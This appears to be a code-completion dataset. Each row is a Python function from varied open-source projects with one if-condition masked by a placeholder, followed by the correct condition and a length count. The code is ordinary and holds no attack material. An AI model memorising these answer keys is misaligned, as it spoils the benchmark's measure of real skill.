3753,"def is_cwl_record(d):<tab>""""""Check if an input is a CWL record, from any level of nesting.""""""<tab>if isinstance(d, dict):<tab><tab><IF-STMT><tab><tab><tab>return d<tab><tab>else:<tab><tab><tab>recs = list(<tab><tab><tab><tab>filter(lambda x: x is not None, [is_cwl_record(v) for v in d.values()])<tab><tab><tab>)<tab><tab><tab>return recs[0] if recs else None<tab>else:<tab><tab>return None","if d . get ( ""type"" ) == ""record"" :",131
3754,"def _flags_data_(self, main_mod, model_paths, flags_dest):<tab>try:<tab><tab>sys_path, mod_path = python_util.find_module(main_mod, model_paths)<tab>except ImportError as e:<tab><tab><IF-STMT><tab><tab><tab>self.log.warning(""cannot import flags from %s: %s"", main_mod, e)<tab><tab>return {}<tab>else:<tab><tab>package = self._main_spec_package(main_mod)<tab><tab>return self._flags_data_for_path(mod_path, package, sys_path, flags_dest)","if os . getenv ( ""NO_WARN_FLAGS_IMPORT"" ) != ""1"" :",159
3755,"def __str__(self):<tab>messages = [self.__class__.__name__, ""(""]<tab>annotation = self.annotation<tab>messages.append(self.annotation.surrounds_attribute or """")<tab>if annotation.tag_attributes:<tab><tab><IF-STMT><tab><tab><tab>messages.append("";"")<tab><tab>for (f, ta, ea) in self.tag_data:<tab><tab><tab>messages += [ea, ': attribute ""', ta, '""']<tab>start, end = annotation.start_index, annotation.end_index<tab>messages.append("", template[%s:%s])"" % (start, end))<tab>return """".join(map(str, messages))",if annotation . surrounds_attribute :,153
3756,"def _on_view_count_change(self, *args):<tab>with self.output:<tab><tab>logger.debug(""views: %d"", self.image.view_count)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>logger.debug(""was dirty, and needs an update"")<tab><tab><tab><tab>self.update()<tab><tab><tab>finally:<tab><tab><tab><tab>self._dirty = False",if self . _dirty and self . image . view_count > 0 :,109
3757,"def network_state(self, device):<tab>cmd = [""tc"", ""qdisc"", ""show"", ""dev"", device]<tab>try:<tab><tab>output = self.host_exec.run(cmd)<tab><tab># sloppy but good enough for now<tab><tab><IF-STMT><tab><tab><tab>return NetworkState.SLOW<tab><tab>if "" loss "" in output:<tab><tab><tab>return NetworkState.FLAKY<tab><tab>if "" duplicate "" in output:<tab><tab><tab>return NetworkState.DUPLICATE<tab><tab>return NetworkState.NORMAL<tab>except Exception:<tab><tab>return NetworkState.UNKNOWN","if "" delay "" in output :",138
3758,"def _remove(self, item):<tab>""""""Internal removal of an item""""""<tab># Manage siblings when items are deleted<tab>for sibling in self.lines[self.lines.index(item) + 1 :]:<tab><tab><IF-STMT><tab><tab><tab>env = sibling.env<tab><tab><tab>sibling.env = item.env<tab><tab><tab>sibling.env.update(env)<tab><tab><tab>sibling.env.job = sibling<tab><tab><tab>break<tab><tab>elif sibling == """":<tab><tab><tab>self.lines.remove(sibling)<tab><tab>else:<tab><tab><tab>break<tab>self.crons.remove(item)<tab>self.lines.remove(item)<tab>return 1","if isinstance ( sibling , CronItem ) :",162
3759,"def _get_transformations(self, current_text, indices_to_modify):<tab>transformed_texts = []<tab>words = current_text.words<tab>for idx in indices_to_modify:<tab><tab>word = words[idx]<tab><tab>swap_idxs = list(set(range(len(words))) - {idx})<tab><tab><IF-STMT><tab><tab><tab>swap_idx = random.choice(swap_idxs)<tab><tab><tab>swapped_text = current_text.replace_word_at_index(<tab><tab><tab><tab>idx, words[swap_idx]<tab><tab><tab>).replace_word_at_index(swap_idx, word)<tab><tab><tab>transformed_texts.append(swapped_text)<tab>return transformed_texts",if swap_idxs :,175
3760,"def _unlock_restarted_vms(self, pool_name):<tab>result = []<tab>for vm in await self.middleware.call(""vm.query"", [(""autostart"", ""="", True)]):<tab><tab>for device in vm[""devices""]:<tab><tab><tab>if device[""dtype""] not in (""DISK"", ""RAW""):<tab><tab><tab><tab>continue<tab><tab><tab>path = device[""attributes""].get(""path"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if path.startswith(f""/dev/zvol/{pool_name}/"") or path.startswith(<tab><tab><tab><tab>f""/mnt/{pool_name}/""<tab><tab><tab>):<tab><tab><tab><tab>result.append(vm)<tab><tab><tab><tab>break<tab>return result",if not path :,172
3761,"def parse_literal_object(node):<tab>value = 0<tab>unit = get_default_weight_unit()<tab>for field in node.fields:<tab><tab>if field.name.value == ""value"":<tab><tab><tab>try:<tab><tab><tab><tab>value = decimal.Decimal(field.value.value)<tab><tab><tab>except decimal.DecimalException:<tab><tab><tab><tab>raise GraphQLError(f""Unsupported value: {field.value.value}"")<tab><tab><IF-STMT><tab><tab><tab>unit = field.value.value<tab>return Weight(**{unit: value})","if field . name . value == ""unit"" :",134
3762,"def _extract_level(self):<tab>""""""Extract level and component if available (lazy).""""""<tab>if self._level is None:<tab><tab>split_tokens = self.split_tokens<tab><tab>if not split_tokens:<tab><tab><tab>self._level = False<tab><tab><tab>self._component = False<tab><tab><tab>return<tab><tab>x = (<tab><tab><tab>self.log_levels.index(split_tokens[1])<tab><tab><tab><IF-STMT><tab><tab><tab>else None<tab><tab>)<tab><tab>if x is not None:<tab><tab><tab>self._level = split_tokens[1]<tab><tab><tab>self._component = split_tokens[2]<tab><tab>else:<tab><tab><tab>self._level = False<tab><tab><tab>self._component = False",if split_tokens [ 1 ] in self . log_levels,185
3763,"def _average_import_time(n: int, module: Text) -> float:<tab>total = 0<tab>for _ in range(n):<tab><tab>lines = subprocess.getoutput(<tab><tab><tab>f'{sys.executable} -X importtime -c ""import {module}""'<tab><tab>).splitlines()<tab><tab>parts = lines[-1].split(""|"")<tab><tab><IF-STMT><tab><tab><tab>raise Exception(f""Import time not found for {module}."")<tab><tab>total += int(parts[1].strip()) / 1000000<tab>return total / n",if parts [ - 1 ] . strip ( ) != module :,133
3764,"def send_preamble(self):<tab>""""""Transmit version/status/date/server, via self._write()""""""<tab>if self.origin_server:<tab><tab>if self.client_is_modern():<tab><tab><tab>self._write(""HTTP/%s %s\r\n"" % (self.http_version, self.status))<tab><tab><tab>if not self.headers.has_key(""Date""):<tab><tab><tab><tab>self._write(""Date: %s\r\n"" % time.asctime(time.gmtime(time.time())))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._write(""Server: %s\r\n"" % self.server_software)<tab>else:<tab><tab>self._write(""Status: %s\r\n"" % self.status)","if self . server_software and not self . headers . has_key ( ""Server"" ) :",199
3765,"def test_source_address(self):<tab>for addr, is_ipv6 in VALID_SOURCE_ADDRESSES:<tab><tab><IF-STMT><tab><tab><tab>warnings.warn(""No IPv6 support: skipping."", NoIPv6Warning)<tab><tab><tab>continue<tab><tab>with HTTPConnectionPool(<tab><tab><tab>self.host, self.port, source_address=addr, retries=False<tab><tab>) as pool:<tab><tab><tab>r = pool.request(""GET"", ""/source_address"")<tab><tab><tab>assert r.data == b(addr[0])",if is_ipv6 and not HAS_IPV6_AND_DNS :,140
3766,"def _run_commands(self, tool, commands, dry_run=False):<tab>if dry_run:<tab><tab>self._dry_run_commands(tool, commands)<tab><tab>return<tab>for command in commands:<tab><tab>try:<tab><tab><tab>with original_ld_library_path():<tab><tab><tab><tab>self.subprocess_utils.run(command, capture_output=True, check=True)<tab><tab>except OSError as ex:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(self._TOOL_NOT_FOUND_MESSAGE % tool)<tab><tab><tab>raise ex<tab>self._write_success_message(tool)",if ex . errno == errno . ENOENT :,154
3767,"def test_float_overflow(self):<tab>import sys<tab>big_int = int(sys.float_info.max) * 2<tab>for t in float_types + [c_longdouble]:<tab><tab>self.assertRaises(OverflowError, t, big_int)<tab><tab><IF-STMT><tab><tab><tab>self.assertRaises(OverflowError, t.__ctype_be__, big_int)<tab><tab>if hasattr(t, ""__ctype_le__""):<tab><tab><tab>self.assertRaises(OverflowError, t.__ctype_le__, big_int)","if hasattr ( t , ""__ctype_be__"" ) :",131
3768,"def init_weights(self):<tab>for n, p in self.named_parameters():<tab><tab><IF-STMT><tab><tab><tab>torch.nn.init.zeros_(p)<tab><tab>elif ""fc"" in n:<tab><tab><tab>torch.nn.init.xavier_uniform_(p)","if ""bias"" in n :",71
3769,"def _compute_dependencies(self):<tab>""""""Gather the lists of dependencies and adds to all_parts.""""""<tab>for part in self.all_parts:<tab><tab>dep_names = self.after_requests.get(part.name, [])<tab><tab>for dep_name in dep_names:<tab><tab><tab>dep = self.get_part(dep_name)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise errors.SnapcraftAfterPartMissingError(part.name, dep_name)<tab><tab><tab>part.deps.append(dep)",if not dep :,127
3770,"def _delete_object(step):<tab>try:<tab><tab>api = kubernetes.client.CustomObjectsApi()<tab><tab>api.delete_namespaced_custom_object(<tab><tab><tab>group=""zalando.org"",<tab><tab><tab>version=""v1"",<tab><tab><tab>plural=""kopfexamples"",<tab><tab><tab>namespace=""default"",<tab><tab><tab>name=f""kopf-example-{step}"",<tab><tab><tab>body={},<tab><tab>)<tab>except kubernetes.client.rest.ApiException as e:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>raise",if e . status in [ 404 ] :,142
3771,"def _lookup(self, key, dicts=None, filters=()):<tab>if dicts is None:<tab><tab>dicts = self.dicts<tab>key_len = len(key)<tab>if key_len > self.longest_key:<tab><tab>return None<tab>for d in dicts:<tab><tab>if not d.enabled:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>value = d.get(key)<tab><tab>if value:<tab><tab><tab>for f in filters:<tab><tab><tab><tab>if f(key, value):<tab><tab><tab><tab><tab>return None<tab><tab><tab>return value",if key_len > d . longest_key :,150
3772,"def fork_with_monitor(receiver: Receiver, func, *args, **kwargs):<tab>current_actor = self()<tab>send(ForkWithMonitor(current_actor, func, args, kwargs), receiver)<tab>while True:<tab><tab>message = recv(current_actor)<tab><tab><IF-STMT><tab><tab><tab>return message.new_actor<tab><tab>else:<tab><tab><tab>send(message, current_actor)<tab>return","if isinstance ( message , ForkResponse ) :",106
3773,"def read(self, size=-1):<tab>if self._offset or (size > -1):<tab><tab># return empty string to indicate EOF if we are offset past the end of the file<tab><tab># else boto will throw an error at us<tab><tab>if self._offset >= self._key.size:<tab><tab><tab>return """"<tab><tab><IF-STMT><tab><tab><tab>sizeStr = str(self._offset + size - 1)  # range header is inclusive<tab><tab>else:<tab><tab><tab>sizeStr = """"<tab><tab>hdrs = {""Range"": ""bytes=%d-%s"" % (self._offset, sizeStr)}<tab>else:<tab><tab>hdrs = {}<tab>buf = self._key.get_contents_as_string(headers=hdrs)<tab>self._offset += len(buf)<tab>return buf",if size > - 1 :,191
3774,"def operations(self):<tab># Search for operations<tab>registered_operations = {}<tab>for fn in hooks.get_hooks(""register_image_operations""):<tab><tab>registered_operations.update(dict(fn()))<tab># Build list of operation objects<tab>operations = []<tab>for op_spec in self.spec.split(""|""):<tab><tab>op_spec_parts = op_spec.split(""-"")<tab><tab><IF-STMT><tab><tab><tab>raise InvalidFilterSpecError(<tab><tab><tab><tab>""Unrecognised operation: %s"" % op_spec_parts[0]<tab><tab><tab>)<tab><tab>op_class = registered_operations[op_spec_parts[0]]<tab><tab>operations.append(op_class(*op_spec_parts))<tab>return operations",if op_spec_parts [ 0 ] not in registered_operations :,181
3775,"def find_widget(self, pos):<tab>for widget in self.subwidgets[::-1]:<tab><tab><IF-STMT><tab><tab><tab>r = widget.rect<tab><tab><tab>if r.collidepoint(pos):<tab><tab><tab><tab>return widget.find_widget(subtract(pos, r.topleft))<tab>return self",if widget . visible :,77
3776,"def _get_body(self):<tab>if self._bodytree is None:<tab><tab>bodytxt = self._message.accumulate_body()<tab><tab><IF-STMT><tab><tab><tab>att = settings.get_theming_attribute(""thread"", ""body"")<tab><tab><tab>att_focus = settings.get_theming_attribute(""thread"", ""body_focus"")<tab><tab><tab>self._bodytree = TextlinesList(bodytxt, att, att_focus)<tab>return self._bodytree",if bodytxt :,114
3777,"def config_mode(self, config_command=""conf t"", pattern=""""):<tab>output = """"<tab><IF-STMT><tab><tab>output = self.send_command_timing(<tab><tab><tab>config_command, strip_command=False, strip_prompt=False<tab><tab>)<tab><tab>if ""to enter configuration mode anyway"" in output:<tab><tab><tab>output += self.send_command_timing(<tab><tab><tab><tab>""YES"", strip_command=False, strip_prompt=False<tab><tab><tab>)<tab><tab>if not self.check_config_mode():<tab><tab><tab>raise ValueError(""Failed to enter configuration mode"")<tab>return output",if not self . check_config_mode ( ) :,152
3778,"def is_enabled(self):<tab>try:<tab><tab>cmd = subprocess.Popen(<tab><tab><tab>""netsh advfirewall show currentprofile"", stdout=subprocess.PIPE<tab><tab>)<tab><tab>out = cmd.stdout.readlines()<tab><tab>for l in out:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>state = l.split()[-1].strip()<tab><tab>return state == ""ON""<tab>except:<tab><tab>return None","if l . startswith ( ""State"" ) :",107
3779,"def __rpc_devices(self, *args):<tab>data_to_send = {}<tab>for device in self.__connected_devices:<tab><tab><IF-STMT><tab><tab><tab>data_to_send[device] = self.__connected_devices[device][<tab><tab><tab><tab>""connector""<tab><tab><tab>].get_name()<tab>return {""code"": 200, ""resp"": data_to_send}","if self . __connected_devices [ device ] [ ""connector"" ] is not None :",106
3780,"def _mock_manager_nfx(self, *args, **kwargs):<tab>if args:<tab><tab><IF-STMT><tab><tab><tab>raise RpcError()<tab><tab>elif args[0].tag == ""get-software-information"" and args[0].find(""./*"") is None:<tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>return self._read_file(""sw_info_nfx_"" + args[0].tag + "".xml"")","if args [ 0 ] . tag == ""command"" :",112
3781,"def empty_logs(self, logs=None):<tab>if self.quick_log:<tab><tab>self.quick_log = []<tab>else:<tab><tab>if is_main_thread():<tab><tab><tab>self.logs = []<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del self.thread_logs[current_thread_id()]",if logs and self . thread_logs . get ( current_thread_id ( ) ) :,98
3782,"def read_cb(dir_path):<tab>df_dict = dict()<tab>for fold in [""train"", ""val"", ""test""]:<tab><tab>columns = [""premise"", ""hypothesis""]<tab><tab><IF-STMT><tab><tab><tab>columns.append(""label"")<tab><tab>jsonl_path = os.path.join(dir_path, ""{}.jsonl"".format(fold))<tab><tab>df = read_jsonl_superglue(jsonl_path)<tab><tab>df = df[columns]<tab><tab>df_dict[fold] = df<tab>return df_dict, None","if fold != ""test"" :",134
3783,def _forward_main_responses(self):<tab>while self._should_keep_going():<tab><tab>line = self._proc.stdout.readline()<tab><tab><IF-STMT><tab><tab><tab># In the beginning the backend may echo commands sent to it (perhaps this echo-avoiding trick<tab><tab><tab># takes time). Don't forward those lines.<tab><tab><tab>continue<tab><tab>if not line:<tab><tab><tab>break<tab><tab>with self._response_lock:<tab><tab><tab>sys.stdout.write(line)<tab><tab><tab>sys.stdout.flush()<tab><tab><tab>self._main_backend_is_fresh = False,if self . _main_backend_is_fresh and self . _looks_like_echo ( line ) :,161
3784,"def _update_server_version(self):<tab>""""""Decode the Transmission version string, if available.""""""<tab>if self.server_version is None:<tab><tab>version_major = 1<tab><tab>version_minor = 30<tab><tab>version_changeset = 0<tab><tab>version_parser = re.compile(""(\d).(\d+) \((\d+)\)"")<tab><tab>if hasattr(self.session, ""version""):<tab><tab><tab>match = version_parser.match(self.session.version)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>version_major = int(match.group(1))<tab><tab><tab><tab>version_minor = int(match.group(2))<tab><tab><tab><tab>version_changeset = match.group(3)<tab><tab>self.server_version = (version_major, version_minor, version_changeset)",if match :,190
3785,"def _check_type(T, allowed):<tab>if T not in allowed:<tab><tab><IF-STMT><tab><tab><tab>allowed.add(T)<tab><tab>else:<tab><tab><tab>types = "", "".join([t.__name__ for t in allowed] + [T.__name__])<tab><tab><tab>raise TypeError(""unsupported mixed types: %s"" % types)",if len ( allowed ) == 1 :,87
3786,"def split_named_range(range_string):<tab>""""""Separate a named range into its component parts""""""<tab>for range_string in SPLIT_NAMED_RANGE_RE.split(range_string)[<tab><tab>1::2<tab>]:  # Skip first and from there every second item<tab><tab>match = NAMED_RANGE_RE.match(range_string)<tab><tab><IF-STMT><tab><tab><tab>raise NamedRangeException('Invalid named range string: ""%s""' % range_string)<tab><tab>else:<tab><tab><tab>match = match.groupdict()<tab><tab><tab>sheet_name = match[""quoted""] or match[""notquoted""]<tab><tab><tab>xlrange = match[""range""]<tab><tab><tab>sheet_name = sheet_name.replace(""''"", ""'"")  # Unescape '<tab><tab><tab>yield sheet_name, xlrange",if match is None :,191
3787,"def clean(self):<tab>to_del = []<tab>for i, file_ in enumerate(self.files):<tab><tab>try:<tab><tab><tab>os.remove(file_)<tab><tab><tab>to_del.append(i)<tab><tab>except Exception:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>to_del.append(i)<tab>for i in to_del[::-1]:<tab><tab>del self.files[i]",if not os . path . isfile ( file_ ) :,108
3788,"def lazy_init(self):<tab>f = open(self.filename)<tab>self.base = {}<tab>while 1:<tab><tab>l = f.readline()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>l = l.strip().split("","")<tab><tab>if len(l) != 3:<tab><tab><tab>continue<tab><tab>c, lat, long = l<tab><tab>self.base[c] = (float(long), float(lat))<tab>f.close()",if not l :,113
3789,"def onto_evo_target(self):<tab>if self._onto_evo_target is None:<tab><tab>self._get_onto_evo_target()<tab>if self._onto_evo_target_qobj is None:<tab><tab><IF-STMT><tab><tab><tab>self._onto_evo_target_qobj = self._onto_evo_target<tab><tab>else:<tab><tab><tab>rev_dims = [self.sys_dims[1], self.sys_dims[0]]<tab><tab><tab>self._onto_evo_target_qobj = Qobj(self._onto_evo_target, dims=rev_dims)<tab>return self._onto_evo_target_qobj","if isinstance ( self . _onto_evo_target , Qobj ) :",176
3790,"def _dnsname_to_pat(dn):<tab>pats = []<tab>for frag in dn.split(r"".""):<tab><tab><IF-STMT><tab><tab><tab># When '*' is a fragment by itself, it matches a non-empty dotless<tab><tab><tab># fragment.<tab><tab><tab>pats.append(""[^.]+"")<tab><tab>else:<tab><tab><tab># Otherwise, '*' matches any dotless fragment.<tab><tab><tab>frag = re.escape(frag)<tab><tab><tab>pats.append(frag.replace(r""\*"", ""[^.]*""))<tab>return re.compile(r""\A"" + r""\."".join(pats) + r""\Z"", re.IGNORECASE)","if frag == ""*"" :",155
3791,"def update(id):<tab>""""""Update a post if the current user is the author.""""""<tab>post = get_post(id)<tab>if request.method == ""POST"":<tab><tab>title = request.form[""title""]<tab><tab>body = request.form[""body""]<tab><tab>error = None<tab><tab><IF-STMT><tab><tab><tab>error = ""Title is required.""<tab><tab>if error is not None:<tab><tab><tab>flash(error)<tab><tab>else:<tab><tab><tab>post.title = title<tab><tab><tab>post.body = body<tab><tab><tab>db.session.commit()<tab><tab><tab>return redirect(url_for(""blog.index""))<tab>return render_template(""blog/update.html"", post=post)",if not title :,168
3792,"def __iter__(self):<tab>for token in base.Filter.__iter__(self):<tab><tab><IF-STMT><tab><tab><tab>attrs = OrderedDict()<tab><tab><tab>for name, value in sorted(token[""data""].items(), key=_attr_key):<tab><tab><tab><tab>attrs[name] = value<tab><tab><tab>token[""data""] = attrs<tab><tab>yield token","if token [ ""type"" ] in ( ""StartTag"" , ""EmptyTag"" ) :",94
3793,"def get_polymorphic_model(data):<tab>for model in itervalues(models):<tab><tab>polymorphic = model.opts.polymorphic<tab><tab>if polymorphic:<tab><tab><tab>polymorphic_key = polymorphic<tab><tab><tab>if isinstance(polymorphic_key, bool):<tab><tab><tab><tab>polymorphic_key = ""type""<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return model<tab>raise ImproperlyConfigured(u""No model found for data: {!r}"".format(data))",if data . get ( polymorphic_key ) == model . __name__ :,133
3794,"def _setup_tag(self, tag):<tab># keeping mutual refs<tab>tag.py_obj = self<tab>self.riot_tag = tag<tab># making the event system call self's methods:<tab>handlers = {}<tab>for ev in lifecycle_ev:<tab><tab>f = getattr(self, ev.replace(""-"", ""_""))<tab><tab><IF-STMT><tab><tab><tab># this.on('mount', function() {...}):<tab><tab><tab># whats nicer?<tab><tab><tab>tag.on(ev, f)",if f :,124
3795,"def selection_only(self):<tab>selection_only = False<tab>sel = self.sel()<tab>if (self.context == ""selection"" or self.context == ""both"") and len(sel):<tab><tab># if multiple lines, always true<tab><tab><IF-STMT><tab><tab><tab>selection_only = True<tab><tab># check threshold<tab><tab>elif self.threshold and not sel[0].empty():<tab><tab><tab>text = self.view.substr(sel[0])<tab><tab><tab>match = re.search(self.threshold, text)<tab><tab><tab>if match:<tab><tab><tab><tab>selection_only = True<tab><tab># no valid selection<tab><tab>else:<tab><tab><tab>selection_only = False<tab>return selection_only",if len ( sel ) > 1 :,174
3796,"def find_torrents_to_fetch(torrent_ids):<tab>to_fetch = []<tab>t = time()<tab>for torrent_id in torrent_ids:<tab><tab>torrent = self.torrents[torrent_id]<tab><tab><IF-STMT><tab><tab><tab>to_fetch.append(torrent_id)<tab><tab>else:<tab><tab><tab># We need to check if a key is expired<tab><tab><tab>for key in keys:<tab><tab><tab><tab>if t - self.cache_times[torrent_id].get(key, 0.0) > self.cache_time:<tab><tab><tab><tab><tab>to_fetch.append(torrent_id)<tab><tab><tab><tab><tab>break<tab>return to_fetch",if t - torrent [ 0 ] > self . cache_time :,180
3797,"def filter(callbackfn):<tab>array = this.to_object()<tab>arr_len = array.get(""length"").to_uint32()<tab>if not callbackfn.is_callable():<tab><tab>raise this.MakeError(""TypeError"", ""callbackfn must be a function"")<tab>T = arguments[1]<tab>res = []<tab>k = 0<tab>while k < arr_len:<tab><tab>if array.has_property(str(k)):<tab><tab><tab>kValue = array.get(str(k))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>res.append(kValue)<tab><tab>k += 1<tab>return res  # converted to js array automatically","if callbackfn . call ( T , ( kValue , this . Js ( k ) , array ) ) . to_boolean ( ) . value :",179
3798,"def generate_py_upgrades(data):<tab>""""""Generate the list of upgrades in upgrades.py.""""""<tab>print("" upgrades.py "".center(60, ""-""))<tab>print(""class Upgrades(enum.IntEnum):"")<tab>print('  """"""The list of upgrades, as returned from RequestData.""""""')<tab>for upgrade in sorted(data.upgrades, key=lambda a: a.name):<tab><tab><IF-STMT><tab><tab><tab>print(""  %s = %s"" % (upgrade.name, upgrade.upgrade_id))<tab>print(""\n"")",if upgrade . name and upgrade . upgrade_id in static_data . UPGRADES :,154
3799,"def get_first_n(l, n, reverse=False):<tab>cur_n = 0<tab>res = []<tab>for si in reversed(l) if reverse else l:<tab><tab>if trade_exchange.is_stock_tradable(stock_id=si, trade_date=trade_date):<tab><tab><tab>res.append(si)<tab><tab><tab>cur_n += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab>return res[::-1] if reverse else res",if cur_n >= n :,120
3800,"def _fill_cache(self):<tab>for task in linux_pslist.linux_pslist(self._config).calculate():<tab><tab>for filp, fd in task.lsof():<tab><tab><tab>filepath = linux_common.get_path(task, filp)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>to_add = filp.dentry.d_inode.i_ino.v()<tab><tab><tab><tab>self.fd_cache[to_add] = [task, filp, fd, filepath]","if type ( filepath ) == str and filepath . find ( ""socket:["" ) != - 1 :",137
3801,"def is_ArAX_implicit(ii):  # allows one implicit fixed reg<tab>a, implicit_fixed = 0, 0<tab>for op in _gen_opnds(ii):<tab><tab>if op_luf_start(op, ""ArAX""):<tab><tab><tab>a += 1<tab><tab><IF-STMT><tab><tab><tab>implicit_fixed += 1<tab><tab>else:<tab><tab><tab>return False<tab>return a == 1 and implicit_fixed <= 1",elif op_reg ( op ) and op_implicit_specific_reg ( op ) :,120
3802,"def auto_resize(self, name: str) -> None:<tab>""""""recompute widget width based on max length of all of the values""""""<tab>widget = self.find_widget(name)<tab>for column in range(len(widget._columns) - 1):<tab><tab>sizes = [len(x[0][column]) + 1 for x in widget.options]<tab><tab><IF-STMT><tab><tab><tab>sizes.append(len(widget._titles[column]) + 1)<tab><tab>widget._columns[column] = max(sizes)",if widget . _titles :,124
3803,"def dns_set_secondary_nameserver():<tab>from dns_update import set_secondary_dns<tab>try:<tab><tab>return set_secondary_dns(<tab><tab><tab>[<tab><tab><tab><tab>ns.strip()<tab><tab><tab><tab>for ns in re.split(r""[, ]+"", request.form.get(""hostnames"") or """")<tab><tab><tab><tab><IF-STMT><tab><tab><tab>],<tab><tab><tab>env,<tab><tab>)<tab>except ValueError as e:<tab><tab>return (str(e), 400)","if ns . strip ( ) != """"",122
3804,"def assert_inputs(inputs, can_be_used=True):<tab># Until we make the dataset private, _different_user() can use it:<tab>with self._different_user_and_history() as other_history_id:<tab><tab>response = self._run(""cat1"", other_history_id, inputs)<tab><tab><IF-STMT><tab><tab><tab>assert response.status_code == 200<tab><tab>else:<tab><tab><tab>self._assert_dataset_permission_denied_response(response)",if can_be_used :,120
3805,"def _handle_start(self, tag, attrib):<tab>if ""translatable"" in attrib:<tab><tab><IF-STMT><tab><tab><tab>self._translate = True<tab><tab><tab>if ""comments"" in attrib:<tab><tab><tab><tab>self._comments.append(attrib[attrib.index(""comments"") + 1])","if attrib [ attrib . index ( ""translatable"" ) + 1 ] == ""yes"" :",83
3806,"def get_command(cls):<tab>ifconfig_cmd = ""ip""<tab>for path in [""/sbin"", ""/usr/sbin"", ""/bin"", ""/usr/bin""]:<tab><tab>if os.path.exists(os.path.join(path, ifconfig_cmd)):<tab><tab><tab><IF-STMT><tab><tab><tab>break<tab>ifconfig_cmd = ifconfig_cmd + "" address show""<tab>return ifconfig_cmd","ifconfig_cmd = os . path . join ( path , ifconfig_cmd )",109
3807,"def render(self):<tab>""""""What to show when printed.""""""<tab>viz = """"<tab>for y in range(self.grid.height):<tab><tab>for x in range(self.grid.width):<tab><tab><tab>c = self.grid[y][x]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>viz += "" ""<tab><tab><tab>else:<tab><tab><tab><tab>viz += self.converter(c)<tab><tab>viz += ""\n""<tab>return viz",if c is None :,110
3808,"def _sorted_layers(self, structure, top_layer_id):<tab>""""""Return the image layers sorted""""""<tab>sorted_layers = []<tab>next_layer = top_layer_id<tab>while next_layer:<tab><tab>sorted_layers.append(next_layer)<tab><tab><IF-STMT>  # v2<tab><tab><tab>break<tab><tab>if ""parent"" not in structure[""repolayers""][next_layer][""json""]:<tab><tab><tab>break<tab><tab>next_layer = structure[""repolayers""][next_layer][""json""][""parent""]<tab><tab>if not next_layer:<tab><tab><tab>break<tab>return sorted_layers","if ""json"" not in structure [ ""repolayers"" ] [ next_layer ] :",162
3809,"def check_sync(self):<tab>login_failures = get_login_failures(datetime.now(), catmsgs())<tab>if login_failures:<tab><tab>return Alert(<tab><tab><tab>SSHLoginFailuresAlertClass,<tab><tab><tab>{<tab><tab><tab><tab>""count"": len(login_failures),<tab><tab><tab><tab>""failures"": """".join(<tab><tab><tab><tab><tab>login_failures<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>else login_failures[:2]<tab><tab><tab><tab><tab>+ [f""... {len(login_failures) - 4} more ...\n""]<tab><tab><tab><tab><tab>+ login_failures[-2:]<tab><tab><tab><tab>),<tab><tab><tab>},<tab><tab>)",if len ( login_failures ) <= 5,172
3810,"def on_user_auth_login_success(sender, user, request, **kwargs):<tab>if settings.USER_LOGIN_SINGLE_MACHINE_ENABLED:<tab><tab>user_id = ""single_machine_login_"" + str(user.id)<tab><tab>session_key = cache.get(user_id)<tab><tab><IF-STMT><tab><tab><tab>session = import_module(settings.SESSION_ENGINE).SessionStore(session_key)<tab><tab><tab>session.delete()<tab><tab>cache.set(user_id, request.session.session_key, None)",if session_key and session_key != request . session . session_key :,146
3811,"def slots_for_entities(self, entities):<tab>if self.store_entities_as_slots:<tab><tab>slot_events = []<tab><tab>for s in self.slots:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>matching_entities = [<tab><tab><tab><tab><tab>e[""value""] for e in entities if e[""entity""] == s.name<tab><tab><tab><tab>]<tab><tab><tab><tab>if matching_entities:<tab><tab><tab><tab><tab>if s.type_name == ""list"":<tab><tab><tab><tab><tab><tab>slot_events.append(SlotSet(s.name, matching_entities))<tab><tab><tab><tab><tab>else:<tab><tab><tab><tab><tab><tab>slot_events.append(SlotSet(s.name, matching_entities[-1]))<tab><tab>return slot_events<tab>else:<tab><tab>return []",if s . auto_fill :,193
3812,"def get(self, id):<tab>obj = self.klass.objects.get(id=id)<tab>if hasattr(obj, ""sharing""):<tab><tab><IF-STMT><tab><tab><tab>return render_template(<tab><tab><tab><tab>""{}/single.html"".format(self.klass.__name__.lower()), obj=obj<tab><tab><tab>)<tab><tab>abort(403)<tab>else:<tab><tab>return render_template(<tab><tab><tab>""{}/single.html"".format(self.klass.__name__.lower()), obj=obj<tab><tab>)<tab>return request.referrer",if group_user_permission ( obj ) :,137
3813,"def __call__(self, module, *x):<tab>""""""Grab the instantiated layer and evaluate it.""""""<tab>operation = getattr(module, self.name)<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return self.func(operation, *x)<tab><tab>return operation(*x)<tab>except:<tab><tab>logger.error(""Failed to apply layer: %s"", self.name)<tab><tab>for i, X in enumerate(x):<tab><tab><tab>logger.error(""  Input shape #%d: %s"", i + 1, list(X.size()))<tab><tab>raise",if self . func :,135
